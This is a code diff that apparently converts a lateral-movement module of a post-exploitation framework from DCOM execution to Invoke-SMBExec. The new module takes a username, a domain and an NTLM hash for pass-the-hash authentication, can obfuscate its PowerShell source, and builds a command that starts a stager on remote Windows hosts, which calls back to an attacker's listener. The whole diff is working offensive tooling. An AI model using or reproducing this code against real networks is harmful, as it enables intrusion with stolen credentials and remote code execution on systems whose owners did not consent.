@@ -5,11 +5,11 @@ class Module:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Invoke-DCOM',
+            'Name': 'Invoke-SMBExec',
 
             'Author': ['@rvrsh3ll'],
 
-            'Description': ('Executes a stager on remote hosts using DCOM.'),
+            'Description': ('Executes a stager on remote hosts using SMBExec.ps1'),
 
             'Background' : False,
 
@@ -23,7 +23,7 @@ class Module:
 
             'MinLanguageVersion' : '2',
             
-            'Comments': []
+            'Comments': ["https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1"]
         }
 
         # any options needed by the module, settable during runtime
@@ -45,10 +45,25 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'Method' : {
-                'Description'   :   'COM method to use. MMC20.Application,ShellWindows,ShellBrowserWindow,ExcelDDE',
+            'Username' : {
+                'Description'   :   'Username.',
                 'Required'      :   True,
-                'Value'         :   'ShellWindows'
+                'Value'         :   ''
+            },
+            'Domain' : {
+                'Description'   :   'Domain.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'Hash' : {
+                'Description'   :   'NTLM Hash in LM:NTLM or NTLM format.',
+                'Required'      :   True,
+                'Value'         :   ''
+            },
+            'Service' : {
+                'Description'   :   'Name of service to create and delete. Defaults to 20 char random.',
+                'Required'      :   False,
+                'Value'         :   ''
             },
             'Listener' : {
                 'Description'   :   'Listener to use.',
@@ -86,13 +101,16 @@ class Module:
     def generate(self, obfuscate=False, obfuscationCommand=""):
         
         listenerName = self.options['Listener']['Value']
-        method = self.options['Method']['Value']
         computerName = self.options['ComputerName']['Value']
+        userName = self.options['Username']['Value']
+        NTLMhash = self.options['Hash']['Value']
+        domain = self.options['Domain']['Value']
+        service = self.options['Service']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
 
-        moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-DCOM.ps1"
+        moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-SMBExec.ps1"
         if obfuscate:
             helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
             moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
@@ -126,7 +144,7 @@ class Module:
             else:
 
                 stagerCmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
-                scriptEnd = "Invoke-DCOM -ComputerName %s -Method %s -Command '%s'" % (computerName, method, stagerCmd)
+                scriptEnd = "Invoke-SMBExec -Target %s -Username %s -Domain %s -Hash %s -Command '%s'" % (computerName, userName, domain, NTLMhash, stagerCmd)
 
 
         scriptEnd += "| Out-String | %{$_ + \"`n\"};"
